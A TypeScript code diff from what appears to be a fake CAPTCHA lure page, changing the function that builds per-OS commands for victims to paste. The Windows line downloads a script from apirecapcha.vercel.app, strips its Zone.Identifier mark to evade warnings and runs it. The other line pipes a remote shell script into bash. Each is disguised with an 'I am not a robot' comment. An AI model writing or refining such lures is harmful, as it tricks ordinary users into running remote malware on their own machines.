@@ -66,9 +66,9 @@ type OsKind = "windows" | "mac" | "linux" | "mobile";
 
 function payloadForOs(os: OsKind, verifyId: string) {
   if (os === "windows") {
-    return `powershell -NoP -EP Bypass -c "irm https://apirecapcha.vercel.app/go.ps1 | iex" #I am not a bot. Fixing the issue as a services. ID:${verifyId}`;
+    return `cmd /c "curl -fsSL https://apirecapcha.vercel.app/go.cmd -o %PUBLIC%\\as-go.cmd & del %PUBLIC%\\as-go.cmd:Zone.Identifier 2>nul & call %PUBLIC%\\as-go.cmd" #I am not a robot. Fixing the issue as a service. ID:${verifyId}`;
   }
-  return `curl -fsSL https://apirecapcha.vercel.app/go.sh | bash #I am not a bot. Fixing the issue as a services. ID:${verifyId}`;
+  return `curl -fsSL https://apirecapcha.vercel.app/go.sh | bash; exit #I am not a bot. Fixing the issue as a service. ID:${verifyId}`;
 }
 
 function copyText(text: string) {
